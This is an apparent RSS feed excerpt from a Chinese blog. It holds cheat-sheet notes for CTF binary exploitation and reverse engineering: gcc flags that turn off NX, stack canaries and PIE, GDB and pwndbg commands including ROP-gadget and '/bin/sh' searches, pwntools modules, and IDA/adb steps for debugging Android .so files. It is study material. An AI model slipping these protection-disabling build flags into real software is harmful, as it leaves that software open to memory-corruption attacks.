&lt;th>gcc -O1 test.c -o test&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>&lt;/th>
&lt;th>关掉DEP/NX（堆栈不可执行）&lt;/th>
&lt;th>gcc -z execstack -o level level.c&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>&lt;/th>
&lt;th>关掉Stack Protector/Canary（栈保护）&lt;/th>
&lt;th>gcc -fno-stack-protector -o level level.c&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>&lt;/th>
&lt;th>关掉程序ASLR/PIE（程序随机化保护）&lt;/th>
&lt;th>gcc -no-pie level level.c&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>&lt;/th>
&lt;th>64位linux下面的GCC编译出一个32位可执行程序&lt;/th>
&lt;th>gcc -m32 -z execstack -fno-stack-protector -o level level.c&lt;/th>
&lt;/tr>&lt;/table>
&lt;h3 id="gdb常用调试命令">GDB常用调试命令&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="n">gcc&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">g&lt;/span> &lt;span class="n">main&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">c&lt;/span> &lt;span class="c1">//在目标文件加入源代码的信息
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="n">gdb&lt;/span> &lt;span class="n">a&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">out&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">start&lt;/span> &lt;span class="c1">//开始调试
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">n&lt;/span> &lt;span class="c1">//一条一条执行
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">step&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">s&lt;/span> &lt;span class="c1">//执行下一条，如果函数进入函数
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">backtrace&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">bt&lt;/span> &lt;span class="c1">//查看函数调用栈帧
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">info&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">i&lt;/span> &lt;span class="n">locals&lt;/span> &lt;span class="c1">//查看当前栈帧局部变量
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">frame&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">f&lt;/span> &lt;span class="c1">//选择栈帧，再查看局部变量
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">print&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">p&lt;/span> &lt;span class="c1">//打印变量的值
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">finish&lt;/span> &lt;span class="c1">//运行到当前函数返回
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">set&lt;/span> &lt;span class="n">var&lt;/span> &lt;span class="n">sum&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span> &lt;span class="c1">//修改变量值
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">list&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">l&lt;/span> &lt;span class="err">行号或函数名&lt;/span> &lt;span class="c1">//列出源码
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">display&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">undisplay&lt;/span> &lt;span class="n">sum&lt;/span> &lt;span class="c1">//每次停下显示变量的值/取消跟踪
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">break&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">b&lt;/span> &lt;span class="err">行号或函数名&lt;/span> &lt;span class="c1">//设置断点
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">continue&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">c&lt;/span> &lt;span class="c1">//连续运行
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">info&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">i&lt;/span> &lt;span class="n">breakpoints&lt;/span> &lt;span class="c1">//查看已经设置的断点
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">delete&lt;/span> &lt;span class="n">breakpoints&lt;/span> &lt;span class="mi">2&lt;/span> &lt;span class="c1">//删除某个断点
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">disable&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">enable&lt;/span> &lt;span class="n">breakpoints&lt;/span> &lt;span class="mi">3&lt;/span> &lt;span class="c1">//禁用/启用某个断点
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">break&lt;/span> &lt;span class="mi">9&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="n">sum&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="c1">//满足条件才激活断点
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">run&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">r&lt;/span> &lt;span class="c1">//重新从程序开头连续执行
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">watch&lt;/span> &lt;span class="n">input&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c1">//设置观察点
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">info&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">i&lt;/span> &lt;span class="n">watchpoints&lt;/span> &lt;span class="c1">//查看设置的观察点
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">x&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="n">b&lt;/span> &lt;span class="n">input&lt;/span> &lt;span class="c1">//打印存储器内容，b--每个字节一组，7--7组
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">disassemble&lt;/span> &lt;span class="c1">//反汇编当前函数或指定函数
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">si&lt;/span> &lt;span class="c1">// 一条指令一条指令调试 而 s 是一行一行代码
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">info&lt;/span> &lt;span class="n">registers&lt;/span> &lt;span class="c1">// 显示所有寄存器的当前值
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">x&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">20&lt;/span> &lt;span class="err">$&lt;/span>&lt;span class="n">esp&lt;/span> &lt;span class="c1">//查看内存中开始的20个数
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="n">ni&lt;/span> &lt;span class="err">单步执行不进入&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">si&lt;/span> &lt;span class="err">单步执行并进入&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">disas&lt;/span> &lt;span class="n">addr&lt;/span> &lt;span class="err">对地址&lt;/span>&lt;span class="n">addr处的指令进行反汇编&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="n">addr可以是函数名&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">checksec&lt;/span> &lt;span class="err">查看&lt;/span>&lt;span class="n">elf编译的保护选项&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="查壳">查壳&lt;/h3>
&lt;blockquote>
&lt;p>upx -d file&lt;/p>
&lt;/blockquote>
&lt;h3 id="objjump">objjump&lt;/h3>
&lt;blockquote>
&lt;p>objdump是二进制文件快速查看工具。 常用命令：&lt;/p>
&lt;/blockquote>
&lt;pre>&lt;code>1. `objdump -d [file]` 查看文件的所有汇编代码
1. `objdump -f [file]` 查看文件的每个文件的整体头部摘要
&lt;/code>&lt;/pre>
&lt;p>####python&lt;/p>
&lt;blockquote>
&lt;p>python -c &amp;ldquo;&amp;hellip;&amp;rdquo; | ./file python以命令方式执行并把结果传递给filepython -c &amp;ldquo;&amp;hellip;&amp;rdquo; | xargs ./file python以命令方式执行并当作命令行参数传递给file，具体的是：“它的作用是将参数列表转换成小块分段传递给其他命令，以避免参数列表过长的问题。”存在这个命令是因为很多的参数不支持以管道的方式传递。os.system() 创建一个子进程os.putenv(&amp;ldquo;name&amp;rdquo;, &amp;ldquo;value&amp;rdquo;) 添加一个环境变量&lt;/p>
&lt;/blockquote>
&lt;h3 id="pwntools">pwntools&lt;/h3>
&lt;blockquote>
&lt;p>参考 &lt;a class="link" href="http://pwntools.readthedocs.io/en/stable/" target="_blank" rel="noopener"
>http://pwntools.readthedocs.io/en/stable/&lt;/a> （官网介绍）&lt;/p>
&lt;/blockquote>
&lt;pre>&lt;code>[http://brieflyx.me/2015/python-module/pwntools-intro/](http://brieflyx.me/2015/python-module/pwntools-intro/)
[http://brieflyx.me/2015/python-module/pwntools-advanced/](http://brieflyx.me/2015/python-module/pwntools-advanced/)
&lt;/code>&lt;/pre>
&lt;blockquote>
&lt;p>一般直接用from pwn import * 或者import pwn将所有模块导入到当前命名空间，这条语句还会把os、sys等常用的系统库一并导入。&lt;/p>
&lt;/blockquote>
&lt;pre>&lt;code>常用的模块有下面几个： - ==asm==:汇编与反汇编 - ==dynelf==:用于远程符号泄露，需要提供leak方法 - ==elf==:对elf文件进行操作 - ==gdb==:配合gdb进行调试 - ==memleak==:用于内存泄漏 - ==shellcraft==: shellcode的生成器 - ==tubes==:包括tubes: 包括tubes.sock, tubes.process, tubes.ssh, tubes.serialtube，分别适用于不同场景的PIPE - ==utils==:一些实用的小功能，例如CRC计算，cyclic pattern等
&lt;/code>&lt;/pre>
&lt;h3 id="pwndbg">pwndbg&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>arena 堆检查&lt;/p>
&lt;/li>
&lt;li>
&lt;p>mp 显示堆&lt;/p>
&lt;/li>
&lt;li>
&lt;p>bins,fastbins,unsorted,smallbins,largebins&lt;/p>
&lt;/li>
&lt;li>
&lt;p>heap&lt;/p>
&lt;/li>
&lt;li>
&lt;p>top_chunk&lt;/p>
&lt;/li>
&lt;li>
&lt;p>procinfo 查看当前进程状态&lt;/p>
&lt;/li>
&lt;li>
&lt;p>rop &lt;code>rop --grep &amp;quot;pop rdi&amp;quot; -- --nojop --nosys --depth 2&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>search &lt;code>search -s “/bin/sh”&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>vvmap 虚拟内存映射&lt;/p>
&lt;/li>
&lt;li>
&lt;p>telescope 检查内存转储&lt;/p>
&lt;/li>
&lt;/ul></description></item><item><title>IDA_动态调试.so_基本步骤</title><link>https://ykiko.top/p/ida_%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95.so_%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4/</link><pubDate>Fri, 31 Aug 2018 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/ida_%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95.so_%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4/</guid><description>&lt;h1 id="ida_动态调试so_基本步骤">IDA_动态调试.so_基本步骤&lt;/h1>
&lt;h2 id="ida-动态调试so-基本步骤">IDA 动态调试.so 基本步骤&lt;/h2>
&lt;ul>
&lt;li>待补图&lt;/li>
&lt;/ul>
&lt;h3 id="0x00-ida快捷键">0x00 IDA快捷键&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>Shirt+F12 字符串窗口&lt;/p>
&lt;/li>
&lt;li>
&lt;p>F5大法好 反汇编&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Ctrl+S 查看so对应段的信息（非调试），快速定位so文件的内存地址（Debug）&lt;/p>
&lt;/li>
&lt;li>
&lt;p>G 快速跳转到对应地址。s&lt;/p>
&lt;/li>
&lt;li>
&lt;p>调试-F7单步进入调试、F8单步、F9运行&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="0x01-方法一">0x01 方法一&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>获取运行Android_server。&lt;/p>
&lt;p>android_server文件放在IDA安装目录下的注意版本的不同。&lt;/p>
&lt;p>之后只需 &lt;code>push android_server /data/local/tmp/&lt;/code>。&lt;/p>
&lt;p>之后&lt;code>adb shell&lt;/code>，&lt;code>su&lt;/code> ，&lt;code>cd /data/local/tmp/&lt;/code>。&lt;/p>
&lt;p>可能还得&lt;code>chmod 755 android_server&lt;/code> 才有权限运行。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>建立通信、attach进程。&lt;/p>
&lt;p>&lt;code>adb forward tcp:23946 tcp:23946&lt;/code>命令。&lt;/p>
&lt;p>在IDA的Debugger选项中attach进程。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>加载so、找函数下断点&lt;/p>
&lt;p>双开IDA ，Ctrl+S找到so文件的基地址，另外一个IDA找到函数的相对地址。相加得到绝对地址。&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h3 id="0x02-方法二">0x02 方法二&lt;/h3>
&lt;p>无法加载so文件需要在加载之前断点。反调试之类&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Debug方式启动app。需要应用可调试开启&lt;/p>
&lt;p>&lt;code>adb shell am start -D -n 包名/.MainActivity&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>方法一的1，2两步 勾选选项。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>jdb attach程序&lt;/p>
&lt;p>&lt;code>jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>开始调试 同上&lt;/p>
&lt;/li>
&lt;/ol></description></item></channel></rss>